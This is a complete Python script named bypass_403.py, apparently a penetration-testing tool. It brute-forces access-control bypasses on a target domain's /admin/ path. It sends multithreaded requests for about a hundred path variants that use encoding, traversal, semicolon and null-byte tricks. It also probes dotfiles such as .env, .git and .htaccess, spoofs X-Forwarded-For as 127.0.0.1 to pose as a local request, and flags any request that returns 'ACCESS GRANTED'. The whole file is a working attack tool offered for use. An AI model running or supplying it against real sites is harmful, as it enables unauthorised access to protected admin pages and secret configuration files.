import requests
import sys
import threading

# Check if domain argument is provided
if len(sys.argv) != 2:
    print("Usage: python bypass_403.py <target-domain>")
    sys.exit(1)

# Target domain from command-line argument
base_url = f"http://{sys.argv[1]}"  # Change to https:// if required

# Common access control bypass techniques
paths = [
    "/admin/", "/admin/?", "/admin//", "/admin///", "/admin////",
    "/admin/./", "/admin/../", "/admin/././", "/admin//..//",
    "/admin%20", "/admin%20/", "/admin%09", "/admin%09/",
    "/admin%0a", "/admin%0a/", "/admin%0d", "/admin%0d/",
    "/admin%23", "/admin%23/", "/admin%3f", "/admin%3f/",
    "/admin%25", "/admin%25/", "/admin%2f", "/admin%2f/",
    "/admin;%2f", "/admin;.json", "/admin;", "/admin;/",
    "/admin?.json", "/admin??", "/admin??/", "/admin?id=1",
    "/admin&", "/admin#", "/admin./", "/admin~", "/admin/~",
    "/admin*", "/admin/*", "/admin;/", "/admin..;/", "/admin../",
    "/%2e/admin", "/%2e/admin/", "/%2e%2e/admin", "/%2e%2e/admin/",
    "/././admin", "/admin/..%3B/", "/admin/;%2f..%2f..%2f",
    "/..;/admin", "/..;/admin/", "/.;/admin", "/.;/admin/",
    "/admin.css", "/admin.html", "/admin.json", "/admin.txt",
    "/admin/?.php", "/admin.asp", "/admin.aspx", "/admin.xml",
    "/admin/.json", "/admin.%00/", "/admin%00", "/admin%20.json",
    "/admin/;", "/admin\\", "/admin/\\", "/admin\\/",
    "/admin\\..\\", "/admin/..\\", "/admin/%2e", "/admin/%2e/",
    "/admin%252e%252e/", "/admin%252f/", "/admin%253b/",
    "/admin/./..//", "/admin/.//.", "/admin/..;./", "/admin/..;/%2f",
    "/admin/%c0%ae/", "/admin/%c0%ae%c0%ae/", "/admin/%u2215/",
    "/admin%u002e%u002e%u2215", "/admin%u2215/",
    "/%2e%2e/%2e%2e/%2e%2e/admin/", "/%2f%2f%2fadmin/",
    "/admin/~dev", "/admin/.git", "/admin/.svn", "/admin/.htaccess",
    "/admin/.DS_Store", "/admin/.well-known", "/admin/.env",
]

# Headers to mimic real browsers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
    "Referer": base_url,
    "X-Forwarded-For": "127.0.0.1",
    "Origin": base_url,
}

# Function to test each URL variation
def test_bypass(path):
    url = base_url + path
    try:
        response = requests.get(url, headers=headers, allow_redirects=False)
        if response.status_code == 200:  
            print(f"\033[92m[+] ACCESS GRANTED: {url} --> Status: {response.status_code}\033[0m")
        elif response.status_code == 403:  
            print(f"\033[91m[-] BLOCKED: {url} --> Status: {response.status_code}\033[0m")
        else:
            print(f"\033[93m[*] INTERESTING RESPONSE: {url} --> Status: {response.status_code}\033[0m")
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[!] ERROR: {url} --> {e}\033[0m")

# Multi-threaded execution for faster testing
threads = []
for path in paths:
    thread = threading.Thread(target=test_bypass, args=(path,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()